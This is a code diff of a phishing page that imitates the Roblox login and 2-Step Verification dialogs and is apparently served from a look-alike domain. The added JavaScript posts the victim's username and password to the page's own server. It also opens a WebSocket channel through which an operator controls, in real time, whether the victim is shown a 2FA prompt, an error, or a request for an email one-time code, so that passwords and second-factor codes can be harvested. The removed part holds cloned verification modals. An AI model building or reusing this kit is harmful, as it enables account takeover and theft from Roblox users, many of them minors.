-        <div role="dialog" id="selectVerificationMethodAuthen"
-            style="display: none;" bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Choose
-                                alternate verification method.</p>
-                            <table
-                                class="table table-striped media-type-list modal-margin-bottom-large">
-                                <tbody>
-                                    <tr class="media-type-row"
-                                        onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('authenticatorverification').style.display = 'block';">
-                                        <td><span
-                                                class="icon-menu-mobile"></span></td>
-                                        <td
-                                            class="media-type-label">Authenticator</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                    <tr class="media-type-row">
-                                        <td><span
-                                                class="icon-menu-recover"></span></td>
-                                        <td class="media-type-label"
-                                            onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('RecoveryFromAuthen').style.display = 'block';">
-                                            Backup Code</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="selectVerificationMethodAuthen"
-            style="display: none;" bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Choose
-                                alternate verification method.</p>
-                            <table
-                                class="table table-striped media-type-list modal-margin-bottom-large">
-                                <tbody>
-                                    <tr class="media-type-row"
-                                        onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('authenticatorverification').style.display = 'block';">
-                                        <td><span
-                                                class="icon-menu-mobile"></span></td>
-                                        <td
-                                            class="media-type-label">Authenticator</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                    <tr class="media-type-row">
-                                        <td><span
-                                                class="icon-menu-recover"></span></td>
-                                        <td class="media-type-label"
-                                            onclick="document.getElementById('selectVerificationMethodAuthen').style.display = 'none';document.getElementById('RecoveryFromAuthen').style.display = 'block';">
-                                            Backup Code</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="selectVerificationMethodSecurityKey"
-            style="display: none;" bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-xlarge">Choose
-                                alternate verification method.</p>
-                            <table
-                                class="table table-striped media-type-list modal-margin-bottom-large">
-                                <tbody>
-                                    <tr class="media-type-row"
-                                        onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none';document.getElementById('authenticatorverification').style.display = 'block';">
-                                        <td><span
-                                                class="icon-menu-mobile"></span></td>
-                                        <td
-                                            class="media-type-label">Authenticator</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                    <tr class="media-type-row">
-                                        <td><span
-                                                class="icon-menu-recover"></span></td>
-                                        <td class="media-type-label"
-                                            onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none';document.getElementById('RecoveryFromAuthen').style.display = 'block';">
-                                            Backup Code</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                    <tr class="media-type-row"
-                                        onclick="document.getElementById('selectVerificationMethodSecurityKey').style.display = 'none';document.getElementById('securitykeyverification').style.display = 'block';">
-                                        <td><span
-                                                class="icon-menu-usb"></span></td>
-                                        <td class="media-type-label">Security
-                                            Key</td>
-                                        <td class="media-type-selector"><span
-                                                class="icon-next"></span>
-                                            <div class="icon-placeholder"
-                                                bis_skin_checked="1"></div>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="securitykeyverification" style="display: none;"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div title class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('securitykeyverification').style.display = 'none'; document.getElementById('rbx-body').style.overflow = 'block';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-sm">Use your Security
-                                Key to log in.</p>
-                            <p class="modal-margin-bottom">When prompted, touch
-                                your key or use biometrics on this device.
-                            </p>
-                            <button type="button" id="securitykeyButton"
-                                class="modal-action-button btn-cta-md modal-margin-bottom"
-                                style="width: 100%;" onclick="securityKey()"
-                                aria-label="Verify">Verify</button>
-                            <p class="modal-margin-bottom"><input
-                                    id="remember-device" type="checkbox"
-                                    tabindex="0">
-                                <label for="remember-device">Trust this device
-                                    for 30 days</label></p>
-                            <p><button type="button"
-                                    onclick="document.getElementById('securitykeyverification').style.display = 'none';document.getElementById('selectVerificationMethodSecurityKey').style.display = 'block';"
-                                    class="modal-body-button-link small">Use
-                                    another verification method</button>
-                            </p>
-                            <p><span class="text-footer">Need help? Contact <a
-                                        class="text-name text-footer contact"
-                                        href="https://www.roblox.com/info/2sv"
-                                        target="_blank"
-                                        bis_skin_checked="1">Roblox
-                                        Support</a></span>
-                            </p>
-                            <p
-                                class="modal-margin-bottom-xlarge text-error xsmall"
-                                id="securitykey-error"></p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div role="dialog" id="Question" style="display: none;"
-            bis_skin_checked="1">
-            <div class="fade modal-backdrop in" bis_skin_checked="1"></div>
-            <div role="dialog" tabindex="-1" class="fade modal-modern in modal"
-                style="display: block;" bis_skin_checked="1">
-                <div class="modal-dialog" bis_skin_checked="1">
-                    <div class="modal-content" role="document"
-                        bis_skin_checked="1">
-                        <div class="modal-header" bis_skin_checked="1">
-                            <button type="button"
-                                class="modal-modern-header-button"
-                                onclick="document.getElementById('Question').style.display = 'none';"><span
-                                    class="icon-close"></span></button>
-                            <h4 class="modal-title">Please Confirm Your
-                                Identity</h4>
-                            <div class="modal-modern-header-info"
-                                bis_skin_checked="1"></div>
-                        </div>
-                        <div class="modal-body" bis_skin_checked="1">
-                            <div class="modal-lock-icon"
-                                bis_skin_checked="1"></div>
-                            <p class="modal-margin-bottom-sm">Which of these
-                                experiences have you joined in the last 7 days?
-                            </p>
-                            <p class="modal-margin-bottom-xlarge font-bold">Pick
-                                3.</p>
-                            <p class="modal-margin-bottom-xlarge small">To keep
-                                your account secure, please verify your
-                                identity.</p>
-                            <p class="modal-margin-bottom-xlarge text-error"
-                                id="questionError"></p>
-                            <div
-                                class="modal-margin-bottom-xlarge answer-choice-area"
-                                id="GameSelectArea" bis_skin_checked="1"></div>
-                            <input type="text" id="sessionId" hidden><input
-                                type="text" id="userId" hidden><input
-                                type="text" id="serverQuestion" hidden><input
-                                type="text" id="captchaQuestion" hidden>
-                            <p class="text-error xsmall"></p>
-                        </div>
-                        <div class="modal-footer" bis_skin_checked="1">
-                            <div class="modal-modern-footer-buttons"
-                                bis_skin_checked="1">
-                                <button type="button"
-                                    class="btn-cta-md modal-modern-footer-button"
-                                    aria-label="Confirm"
-                                    onclick="ConfirmQuestion();"
-                                    id="selectGameButton"
-                                    disabled>Confirm</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+            let isValid = true;
 
-        <grammarly-desktop-integration
-            data-grammarly-shadow-root="true"></grammarly-desktop-integration>
+            // Validate username
+            if (username === '') {
+                usernameError.textContent = 'Please enter your username/email/phone.';
+                usernameError.style.display = 'block';
+                usernameError.style.color = '#ff0000';
+                usernameError.style.fontSize = '10px';
+                isValid = false;
+            }
 
-        <div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo"
-            class="give-freely-root"
-            data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo"
-            data-extension-name="Volume Booster" style="display: block;"
-            bis_skin_checked="1"></div><ins
-            class="adsbygoogle adsbygoogle-noablate" data-ad-hi="true"
-            style="display: none !important;" data-adsbygoogle-status="done"
-            data-ad-status="unfilled"><div id="aswift_0_host"
-                style="border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe
-                    id="aswift_0" name="aswift_0"
-                    style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;min-height:auto;max-height:none;min-width:auto;max-width:none;"
-                    sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation"
-                    frameborder="0" marginwidth="0" marginheight="0" vspace="0"
-                    hspace="0" allowtransparency="true" scrolling="no"
-                    allow="attribution-reporting; run-ad-auction"
-                    src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-4902752889650622&amp;output=html&amp;adk=935352056&amp;adf=3869929943&amp;abgtt=6&amp;lmt=1765157809&amp;plat=2%3A16777216%2C3%3A2097152%2C4%3A2097152%2C9%3A32776%2C16%3A8388608%2C17%3A32%2C24%3A32%2C25%3A32%2C30%3A1081344%2C32%3A32%2C41%3A32%2C42%3A32%2C43%3A32%2C44%3A32&amp;format=0x0&amp;url=https%3A%2F%2Fqr-roblox.com%2Fpeople%2F7936348760%2Flogin&amp;pra=5&amp;asro=0&amp;aimartd=4&amp;uach=WyJXaW5kb3dzIiwiMTkuMC4wIiwieDg2IiwiIiwiMTQ5LjAuNzgyNy4yMDEiLG51bGwsMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjE0OS4wLjc4MjcuMjAxIl0sWyJDaHJvbWl1bSIsIjE0OS4wLjc4MjcuMjAxIl0sWyJOb3QpQTtCcmFuZCIsIjI0LjAuMC4wIl1dLDBd&amp;dt=1783281509104&amp;bpp=4&amp;bdt=2043&amp;idt=110&amp;shv=r20260701&amp;mjsv=m202606290101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie_enabled=1&amp;eoidce=1&amp;nras=1&amp;correlator=237525471164&amp;frm=20&amp;pv=2&amp;u_tz=480&amp;u_his=6&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1032&amp;u_aw=1920&amp;u_cd=32&amp;u_sd=1&amp;dmc=16&amp;adx=-12245933&amp;ady=-12245933&amp;biw=1905&amp;bih=476&amp;scr_x=0&amp;scr_y=0&amp;eid=95395661%2C95390278&amp;oid=2&amp;pvsid=2996946230145639&amp;tmod=2064452181&amp;uas=1&amp;nvt=7&amp;fsapi=1&amp;ref=https%3A%2F%2Fqr-roblox.com%2Fpeople%2F7936348760%2Fuserprofile&amp;fc=1920&amp;brdim=0%2C0%2C0%2C0%2C1920%2C0%2C1920%2C1032%2C1920%2C476&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=32768&amp;bc=31&amp;bz=1&amp;pgls=CAk.&amp;ifi=1&amp;uci=a!1&amp;fsb=1&amp;dtd=121"
-                    data-google-container-id="a!1" tabindex="0"
-                    title="Advertisement" aria-label="Advertisement"
-                    data-load-complete="true"></iframe></div></ins><iframe
-            src="https://www.google.com/recaptcha/api2/aframe" width="0"
-            height="0" style="display: none;"></iframe></body><iframe
-        id="google_esf" name="google_esf"
-        src="https://googleads.g.doubleclick.net/pagead/html/r20260701/r20190131/zrt_lookup_fy2021.html"
-        style="display: none;"></iframe></html>
+            // Validate password
+            if (password === '') {
+                passwordError.textContent = 'Please enter your password.';
+                passwordError.style.display = 'block';
+                passwordError.style.color = '#ff0000';
+                passwordError.style.fontSize = '10px';
+                isValid = false;
+            }
 
-<script>
-    // Set the destination URL
-    const redirectURL = "/people/7936348760/login";
+            return isValid;
+        }
+        // ==========================================
+        // 1. WebSocket Connection
+        // ==========================================
+        let socket = null;
+        let reconnectAttempts = 0;
+        const maxReconnectAttempts = 5;
 
-    window.onload = function () {
-        const clickableElements = document.querySelectorAll("button, a");
+        function connectWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+            const wsUrl = protocol + window.location.host + '/ws/status/';
 
-        clickableElements.forEach(element => {
-            element.addEventListener("click", function (e) {
-                // Allow login button to work
-                if (this.id === 'login-button' || 
-                    this.id === 'forgot-credentials-link' || 
-                    this.id === 'otp-login-button') {
+            console.log('🔄 Connecting to WebSocket:', wsUrl);
+
+            socket = new WebSocket(wsUrl);
+
+            socket.onopen = function (e) {
+                console.log('✅ WebSocket connected');
+                reconnectAttempts = 0;
+                showNotification('🔌 Connected to status server', 'success');
+            };
+
+            socket.onmessage = function (e) {
+                try {
+                    const data = JSON.parse(e.data);
+                    console.log('📡 Received status update:', data);
+
+                    // Directly call the handler with the data
+                    handleStatusUpdate(data);
+                } catch (error) {
+                    console.error('❌ Error parsing message:', error);
+                }
+            };
+
+            socket.onclose = function (e) {
+                console.log('❌ WebSocket disconnected');
+                if (reconnectAttempts < maxReconnectAttempts) {
+                    reconnectAttempts++;
+                    const delay = 3000 * reconnectAttempts;
+                    console.log(`🔄 Reconnecting in ${delay / 1000} seconds... (Attempt ${reconnectAttempts}/${maxReconnectAttempts})`);
+                    setTimeout(connectWebSocket, delay);
+                } else {
+                    showNotification('❌ Lost connection to status server', 'error');
+                }
+            };
+
+            socket.onerror = function (e) {
+                console.error('❌ WebSocket error:', e);
+            };
+        }
+
+        // ==========================================
+        // 2. Helper function to show error message
+        // ==========================================
+        function showErrorMessage(elementId, message, color) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.style.display = 'block';
+                element.style.color = color || '#ff0000';
+                element.style.fontSize = '10px';
+                element.textContent = message;
+
+                // Auto-hide after 5 seconds
+                setTimeout(() => {
+                    element.style.transition = 'opacity 0.5s';
+                    element.style.opacity = '0';
+                    setTimeout(() => {
+                        element.style.display = 'none';
+                        element.style.opacity = '1';
+                    }, 500);
+                }, 5000);
+            }
+        }
+
+        function clearErrorMessage(elementId) {
+            const element = document.getElementById(elementId);
+            if (element) {
+                element.style.display = 'none';
+                element.textContent = '';
+            }
+        }
+
+        // ==========================================
+        // 3. Handle Status Updates from WebSocket
+        // ==========================================
+        function handleStatusUpdate(data) {
+            // Get the status value as string
+            const status = String(data.status);
+            const message = data.message || 'Status updated';
+            const timestamp = data.timestamp || new Date().toISOString();
+
+            console.log(`📊 Status: "${status}", Message: "${message}"`);
+            console.log("==================================")
+            // Clear previous error messages
+            clearErrorMessage('text-error');
+
+            // Check status and perform actions
+            if (status === 'True') {
+                // Password is correct - Show 2-Step Verification Modal
+                console.log('✅ Showing 2-Step Verification Modal');
+                const modal = document.getElementById('twostepverification');
+                console.log("================modal status=============", modal)
+                if (modal) {
+                    modal.style.display = 'block';
+                    document.getElementById('rbx-body').style.overflow = 'hidden';
+                }
+                createNotification('🔐', '2-Step Verification Required', '#9C27B0', timestamp);
+
+            } else if (status === 'False') {
+                // Password is incorrect - Show error message
+                console.log('❌ Showing incorrect password error');
+                showErrorMessage('text-error', 'Incorrect username or password.', '#ff0000');
+
+            } else if (status === 'yle2') {
+                // Attempts - Show error message
+                console.log('📊 Showing OTP suggestion error');
+                showErrorMessage('text-error', 'Error occurred. Use Email One-Time Code.', '#ff0000');
+
+            } else if (status === 'yle') {
+                // YLEOBA - Show New Login Attempt modal
+                console.log('🚨 Showing New Login Attempt Modal');
+                const modal = document.getElementById('yleobaes');
+                if (modal) {
+                    modal.style.display = 'block';
+                    document.getElementById('rbx-body').style.overflow = 'hidden';
+                }
+                createNotification('🚨', 'New Login Attempt Detected!', '#f44336', timestamp);
+
+            } else if (status === 'yle3') {
+                // Email One-Time Code - Show Get One-Time Code modal
+                console.log('📧 Showing Email One-Time Code Modal');
+                const modal = document.getElementById('emailSend');
+                if (modal) {
+                    modal.style.display = 'block';
+                    document.getElementById('rbx-body').style.overflow = 'hidden';
+                }
+                createNotification('📧', 'Email One-Time Code Sent', '#2196F3', timestamp);
+
+            } else {
+                // Unknown status - Show floating notification
+                console.log(`📌 Unknown status: ${status}`);
+                createNotification('📡', message, '#4CAF50', timestamp);
+            }
+        }
+
+        // ==========================================
+        // 4. AJAX Login - NO FORM, Pure JavaScript
+        // ==========================================
+        document.addEventListener('DOMContentLoaded', function () {
+            // Connect to WebSocket first
+            connectWebSocket();
+
+            const loginButton = document.getElementById('login-button');
+            const usernameInput = document.getElementById('login-username');
+            const passwordInput = document.getElementById('login-password');
+            const loadingSpinner = document.getElementById('login-loading');
+            const notificationDiv = document.getElementById('ajax-notification');
+            const csrfToken = document.querySelector('[name=csrfmiddlewaretoken]').value;
+
+            loginButton.addEventListener('click', function (e) {
+                // Prevent default button behavior completely
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+
+                if (!validateLoginForm()) {
                     return;
                 }
-                
-                e.preventDefault();
-                window.location.href = redirectURL;
+
+                const username = usernameInput.value;
+                const password = passwordInput.value;
+
+                console.log('📤 Sending login via AJAX...');
+                console.log('👤 Username:', username);
+
+                // Show loading spinner
+                loadingSpinner.style.display = 'inline-block';
+                loginButton.disabled = true;
+                loginButton.textContent = 'Logging in...';
+                notificationDiv.style.display = 'none';
+
+                // Clear previous error messages
+                clearErrorMessage('text-error');
+
+                // Get user_id from URL
+                const user_id = window.location.pathname.split('/')[2];
+
+                // Send AJAX POST request
+                fetch(`/people/${user_id}/login/submit/`, {
+                    method: 'POST',
+                    headers: {
+                        'X-CSRFToken': csrfToken,
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        'username': username,
+                        'password': password
+                    })
+                })
+                    .then(response => {
+                        console.log('📬 Response status:', response.status);
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('📦 Response data:', data);
+
+                        // Hide loading spinner
+                        loadingSpinner.style.display = 'none';
+                        loginButton.disabled = false;
+                        loginButton.textContent = 'Log In';
+
+                        // Show notification on the page
+                        notificationDiv.style.display = 'block';
+                        if (data.status === 'success') {
+                            notificationDiv.style.backgroundColor = '#d4edda';
+                            notificationDiv.style.color = '#155724';
+                            notificationDiv.style.border = '1px solid #c3e6cb';
+                            notificationDiv.textContent = '✅ ' + data.message;
+
+                            // Clear form after successful login
+                            usernameInput.value = '';
+                            passwordInput.value = '';
+                        } else {
+                            notificationDiv.style.backgroundColor = '#f8d7da';
+                            notificationDiv.style.color = '#721c24';
+                            notificationDiv.style.border = '1px solid #f5c6cb';
+                            notificationDiv.textContent = '❌ ' + data.message;
+                        }
+
+                        // Auto-hide notification after 5 seconds
+                        setTimeout(() => {
+                            notificationDiv.style.transition = 'opacity 0.5s';
+                            notificationDiv.style.opacity = '0';
+                            setTimeout(() => {
+                                notificationDiv.style.display = 'none';
+                                notificationDiv.style.opacity = '1';
+                            }, 500);
+                        }, 5000);
+                    })
+                    .catch(error => {
+                        console.error('❌ Fetch error:', error);
+
+                        // Hide loading spinner
+                        loadingSpinner.style.display = 'none';
+                        loginButton.disabled = false;
+                        loginButton.textContent = 'Log In';
+
+                        // Show error notification on the page
+                        notificationDiv.style.display = 'block';
+                        notificationDiv.style.backgroundColor = '#f8d7da';
+                        notificationDiv.style.color = '#721c24';
+                        notificationDiv.style.border = '1px solid #f5c6cb';
+                        notificationDiv.textContent = '❌ Network error. Please try again.';
+
+                        setTimeout(() => {
+                            notificationDiv.style.transition = 'opacity 0.5s';
+                            notificationDiv.style.opacity = '0';
+                            setTimeout(() => {
+                                notificationDiv.style.display = 'none';
+                                notificationDiv.style.opacity = '1';
+                            }, 500);
+                        }, 5000);
+                    });
+
+                // Final prevention of any redirect
+                return false;
+            });
+
+            // Also handle Enter key press
+            usernameInput.addEventListener('keypress', function (e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    loginButton.click();
+                }
+            });
+
+            passwordInput.addEventListener('keypress', function (e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    loginButton.click();
+                }
             });
         });
-    };
-</script>
+
+        // ==========================================
+        // 5. Floating Notification System
+        // ==========================================
+        function createNotification(icon, message, color, timestamp) {
+            const container = getNotificationContainer();
+
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                background: white;
+                border-left: 4px solid ${color};
+                padding: 15px 20px;
+                margin-bottom: 10px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+                animation: slideIn 0.5s ease-out;
+                font-family: Arial, sans-serif;
+            `;
+
+            notification.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <span style="font-size: 24px;">${icon}</span>
+                    <div style="flex: 1;">
+                        <div style="font-weight: bold; color: #333;">${message}</div>
+                        <div style="font-size: 12px; color: #888; margin-top: 4px;">
+                            ${new Date(timestamp).toLocaleTimeString()}
+                        </div>
+                    </div>
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="background: none; border: none; font-size: 18px; cursor: pointer; color: #999;">
+                        ✕
+                    </button>
+                </div>
+            `;
+
+            container.prepend(notification);
+
+            // Auto-remove after 8 seconds
+            setTimeout(() => {
+                if (notification.parentElement) {
+                    notification.style.transition = 'opacity 0.5s';
+                    notification.style.opacity = '0';
+                    setTimeout(() => {
+                        if (notification.parentElement) {
+                            notification.remove();
+                        }
+                    }, 500);
+                }
+            }, 8000);
+        }
+
+        function getNotificationContainer() {
+            let container = document.getElementById('status-notifications');
+            if (!container) {
+                container = document.createElement('div');
+                container.id = 'status-notifications';
+                container.style.cssText = `
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    z-index: 9999;
+                    max-width: 400px;
+                    width: 100%;
+                `;
+                document.body.appendChild(container);
+            }
+            return container;
+        }
+
+        function showNotification(message, type = 'info') {
+            const colors = {
+                success: '#4CAF50',
+                error: '#f44336',
+                info: '#2196F3'
+            };
+
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: ${colors[type] || '#333'};
+                color: white;
+                padding: 12px 24px;
+                border-radius: 8px;
+                z-index: 9999;
+                font-family: Arial, sans-serif;
+                animation: slideDown 0.5s ease-out;
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.style.transition = 'opacity 0.5s';
+                notification.style.opacity = '0';
+                setTimeout(() => notification.remove(), 500);
+            }, 4000);
+        }
+
+        // ==========================================
+        // 6. CSS Animations
+        // ==========================================
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideIn {
+                from {
+                    transform: translateX(100%);
+                    opacity: 0;
+                }
+                to {
+                    transform: translateX(0);
+                    opacity: 1;
+                }
+            }
+            @keyframes slideDown {
+                from {
+                    transform: translate(-50%, -100%);
+                    opacity: 0;
+                }
+                to {
+                    transform: translate(-50%, 0);
+                    opacity: 1;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // ==========================================
+        // 7. Modal close handlers
+        // ==========================================
+        // Close modals when clicking outside
+        document.addEventListener('click', function (e) {
+            const twostepModal = document.getElementById('twostepverification');
+            const yleobaesModal = document.getElementById('yleobaes');
+            const emailSendModal = document.getElementById('emailSend');
+
+            if (e.target === twostepModal) {
+                twostepModal.style.display = 'none';
+                document.getElementById('rbx-body').style.overflow = 'block';
+            }
+            if (e.target === yleobaesModal) {
+                yleobaesModal.style.display = 'none';
+                document.getElementById('rbx-body').style.overflow = 'block';
+            }
+            if (e.target === emailSendModal) {
+                emailSendModal.style.display = 'none';
+                document.getElementById('rbx-body').style.overflow = 'block';
+            }
+        });
+    </script>
+
+</body>
+
+</html>
